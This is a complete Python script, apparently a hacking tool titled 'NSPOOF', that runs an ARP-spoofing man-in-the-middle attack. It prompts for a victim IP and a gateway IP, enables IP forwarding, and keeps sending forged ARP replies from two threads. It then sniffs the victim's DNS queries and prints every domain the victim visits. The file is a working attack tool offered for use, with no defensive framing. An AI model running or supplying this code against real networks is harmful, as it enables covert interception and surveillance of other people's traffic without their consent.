import os
from scapy.all import *
import sys
import threading
from termcolor import colored

print colored("\n\n'##::: ##::'######::'########:::'#######:::'#######::'########:", "red")
print colored("###:: ##:'##... ##: ##.... ##:'##.... ##:'##.... ##: ##.....::", "red")
print colored("####: ##: ##:::..:: ##:::: ##: ##:::: ##: ##:::: ##: ##:::::::", "red")
print colored("## ## ##:. ######:: ########:: ##:::: ##: ##:::: ##: ######:::", "red")
print colored("##. ####::..... ##: ##.....::: ##:::: ##: ##:::: ##: ##...::::", "red")
print colored("##:. ###:'##::: ##: ##:::::::: ##:::: ##: ##:::: ##: ##:::::::", "red")
print colored("##::. ##:. ######:: ##::::::::. #######::. #######:: ##:::::::", "red")
print colored("..::::..:::......:::..::::::::::.......::::.......:::..::::::::\n\n\n", "red")

vIP = raw_input("Victims IP: ")
gIP = raw_input("Gateway IP: ")
interface = raw_input("Interface to use: ")
path = raw_input("Enter path of ip forwarding config file (put \"d\" for default \"/proc/sys/net/ipv4/ip_forward\":")
if path == "d":
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
else:
	os.system("echo 1 > " + path)

print colored("If you did not run as root, this program might not work as expected!", "red")

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def reArp():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	vMac = MACsnag(vIP)
	gMac = MACsnag(gIP)
	send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc = gMac), count = 4)
	send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc = vMac), count = 4)

def handle_dns(pkt):
	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and pkt.getlayer(IP).src == vIP:
		print colored("Poisoned victim " + pkt.getlayer(IP).src + " has visited " + pkt.getlayer(DNS).qd.qname + "\n", "blue")

def poisonGateway():
	gMac = MACsnag(gIP)
	g = ARP(pdst=gIP, psrc=vIP, hwdst=gMac)
	while True:
		try:
			send(g, verbose = 0, inter = 1, loop = 1)
		except KeyboardInterrupt:
			print "KeyboardInterrupt requested, shutting down..."
			sys.exit(1)

def poisonVictim():
	vMac = MACsnag(vIP)
	v = ARP(pdst=vIP, psrc=gIP, hwdst=vMac)
	while True:
		try:
			send(v, verbose = 0, inter = 1, loop = 1)
		except KeyboardInterrupt:
			print "KeyboardInterrupt requested, shutting down..."
			reArp()
			sys.exit(1)

while True:
	try:
		poison_v = threading.Thread(target=poisonVictim)
		poison_v.setDaemon(True)
		poison_v.start()

		poison_gw = threading.Thread(target=poisonGateway)
		poison_gw.setDaemon(True)
		poison_gw.start()

		pkt = sniff(iface=interface, filter="udp port 53", prn=handle_dns)
	except KeyboardInterrupt:
		reArp()
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		sys.exit()
